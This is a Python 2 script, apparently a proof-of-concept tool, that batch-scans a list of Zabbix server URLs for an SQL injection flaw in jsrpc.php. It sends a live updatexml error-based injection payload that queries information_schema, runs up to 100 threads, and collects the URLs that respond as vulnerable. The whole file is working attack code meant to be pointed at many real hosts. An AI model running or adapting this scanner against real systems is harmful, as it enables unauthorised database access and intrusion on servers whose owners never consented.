#coding=utf-8
import requests
import argparse
import threading
import re
import time

url_exploit=[]
mutex=threading.Lock()
ThreadNum=threading.Semaphore(100) #thread num


banner = u'''\
# Zabbix POC 批量扫描
# 时间：2016年8月22日
#
'''
def verity(url):
    ThreadNum.acquire()
    global url_exploit
    Zabbix_POC = "jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,(select(select+concat(0x7e,count(*),0x7e)+from+information_schema.schemata)),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
    poc_url=url+Zabbix_POC
    content=requests.get(poc_url,timeout=4)
    mutex.acquire()
    p=re.compile(r"\~\d\~")
    if p.search(content.text) and content.status_code==200:
        url_exploit.append(url)
        print "yes"
    else:
        print "no"
    mutex.release()
    ThreadNum.release()

def main():
    print banner
    fr=open("zabbix_url","r")
    url=fr.readline()
    while(url):
        url=url[0:-1]
        t=threading.Thread(target=verity,args=(url,))
        t.setDaemon(True)
        t.start()
        url=fr.readline()
    t.join()

    while(threading.activeCount()!=1):
        time.sleep(1)
    fr.close()
    print "---------------------------------------------------------"
    print "{num} urls vulnerable:".format(num=len(url_exploit))
    print url_exploit
    print "---------------------------------------------------------"
    print "over!"

if __name__=="__main__":
    main()
